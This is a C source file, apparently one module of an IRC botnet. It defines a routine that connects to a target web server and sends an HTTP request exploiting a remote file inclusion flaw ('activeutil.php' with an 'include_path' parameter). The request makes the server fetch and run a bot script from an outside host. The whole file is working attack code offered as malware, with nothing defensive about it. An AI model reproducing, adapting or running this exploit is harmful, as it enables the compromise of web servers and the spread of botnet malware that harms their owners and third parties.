#include "headers/includes.h"
#include "headers/functions.h"


#ifndef NO_RFI
char szPayload[] = "/lib/activeutil.php?set[include_path]=http://w32-gen.us/bot.php?";

BOOL RFI(EXINFO exinfo)
{
	SOCKET fd;
	sockaddr_in saddr;
	char request[IRCLINE*2];
 
	fd = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(fd == SOCKET_ERROR) return FALSE;
 
	saddr.sin_family = AF_INET;
	saddr.sin_port = fhtons(exinfo.port);
	saddr.sin_addr.S_un.S_addr = finet_addr(exinfo.ip);
 
	if( fconnect(fd, (const sockaddr*)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{
		fclosesocket(fd);
		return FALSE;
	}
 
	_snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nUser-Agent: null was here.\r\nHost: %s\r\nAccept: */*\r\nConnection: close\n\n\n\n", szPayload, exinfo.ip);
 
	fsend(fd, request, strlen(request), 0);
	fclosesocket(fd);
 
	return TRUE;



}

#endif